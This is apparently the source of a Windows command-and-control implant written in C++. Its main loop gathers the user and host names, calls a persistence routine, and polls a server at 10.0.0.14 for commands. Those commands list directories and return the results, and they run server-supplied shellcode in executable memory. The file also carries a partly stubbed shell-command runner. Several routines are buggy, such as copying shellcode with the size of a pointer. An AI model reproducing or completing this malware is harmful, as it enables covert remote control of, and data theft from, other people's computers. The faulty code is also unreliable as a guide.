#include <Windows.h>
#include <iostream>
#include <Lmcons.h>
#include <thread>
#include <vector>
#include <string>
#include "persist.h"
#include "http.h"
#include "bot.h"

string utf8_encode(const wstring& wstr)
{
    if (wstr.empty()) return string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}



string list(LPCWSTR path) {
    WIN32_FIND_DATA data;
    HANDLE hFind = FindFirstFile(path, &data);
    string result;
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            result += utf8_encode(data.cFileName) + string("\n");
        } while (FindNextFile(hFind, &data));
        FindClose(hFind);
        return result;
    }
}


void execute_shell_code(char* shellcode) {
    if (shellcode == "\0" || shellcode == NULL ) {
        return;
    }
    PVOID shellcode_exec = VirtualAlloc(NULL, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(shellcode_exec, shellcode, sizeof shellcode);
    DWORD threadID;
    HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
    WaitForSingleObject(hThread, INFINITE);
    return;
}


vector<string> get_verb_split(string cmd) {
    string c, a;
    
    c = cmd.substr(0, cmd.find(' '));
    a = cmd.substr(cmd.find(' ')+1, cmd.length());
    vector<string>v;
    
    v.push_back(c);
    v.push_back(a);
    return v;
}

string exec_shell_cmd(string cmd) {
    HANDLE out_read = 0;
    HANDLE out_write = 0;
    SECURITY_ATTRIBUTES security;
    security.nLength = sizeof SECURITY_ATTRIBUTES;
    security.bInheritHandle = NULL;
    security.bInheritHandle = TRUE;
    security.lpSecurityDescriptor = NULL;
    string command = "echo end > end.txt";
    //command += cmd;

    if (!CreatePipe(&out_read, &out_write, &security, 0)) {
        cout << "Error: StdoutRd CreatePipe" << endl;
        return "ERROR";
    }
    if (!SetHandleInformation(out_read, HANDLE_FLAG_INHERIT, 0)) {
        cout << "Stdout SetHandleInformation" << endl;
        return "ERROR";
    }

    STARTUPINFO startup;
    PROCESS_INFORMATION p;
    ZeroMemory(&startup, sizeof(STARTUPINFO));
    startup.cb = sizeof startup;
    startup.hStdError = out_write;
    startup.hStdOutput = out_write;
    startup.dwFlags |= STARTF_USESTDHANDLES;
    ZeroMemory(&p, sizeof(PROCESS_INFORMATION));
    cout << command << endl;
    if (!CreateProcess(L"C:\\Windows\\System32\\cmd.exe", (LPWSTR)command.c_str(),  NULL, NULL, TRUE,
        0, NULL, NULL,NULL, &p))
    {
        cout << "CreateProcess failed (" << GetLastError() << ")" << endl;
        return "ERROR";
    }
    CloseHandle(out_write);
    cout << "created proccess" << endl;
    // Wait until child process exits.
    WaitForSingleObject(p.hProcess, INFINITE);
    cout << "PLs exit" << endl;
    // Close process and thread handles.
    CloseHandle(p.hProcess);
    CloseHandle(p.hThread);

    cout << "closed handles" << endl;

    DWORD dwRead;
    CHAR  chBuf[127];
    string output;
    while (ReadFile(out_read, chBuf, 127, &dwRead, NULL)) {
        output += chBuf;
    }
    CloseHandle(out_read);
   
    return output;

}

int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
//int main()
{
    set_run();
    char username[UNLEN + 1];
    char hostname[UNLEN + 1];
    DWORD hostname_len = UNLEN + 1;
    DWORD username_len = UNLEN + 1;
    GetUserNameA(username, &username_len);
    GetComputerNameA(hostname, &hostname_len);
    Bot bot = Bot("windows", "456822", username, hostname, "10.0.0.14");

   // cout << exec_shell_cmd("dir") << endl;
    while (true) {
        string cmd_raw = bot.ping_server();
        cout << cmd_raw << endl;
        if (cmd_raw == "") {
            cout << "empty cmd" << endl;
            this_thread::sleep_for(chrono::seconds(10));
            continue;
        }
        vector<string> cmd;
        if (cmd_raw.find(" ") != string::npos) {
            cmd = get_verb_split(cmd_raw);
        }
        else {
            cmd.push_back(cmd_raw);
        }
        cout << cmd[0] << endl;
        //cout << cmd[1] << endl;
        cout << "ping" << endl;
        if (cmd[0] == "ls") {
            wstring wpath;
            if (cmd.size() > 1) {
                string path = cmd[1];
                path += "\\*";
                cout << path << endl;
                wpath = s2ws(path);

            }
            else {
                wpath = L"C:\\\*";
            }
            bot.send_output(list((LPCWSTR)wpath.c_str()));
        }
        else if (cmd[0] == "shellcode") {
            char* code = (char*)cmd[1].c_str();
            execute_shell_code(code);
            cout << "end\n";
        }
        else if (cmd[0] == "shell") {
            cout << cmd[1] << endl;

      

        }
        this_thread::sleep_for(chrono::seconds(10));
    }


    return 0;
}
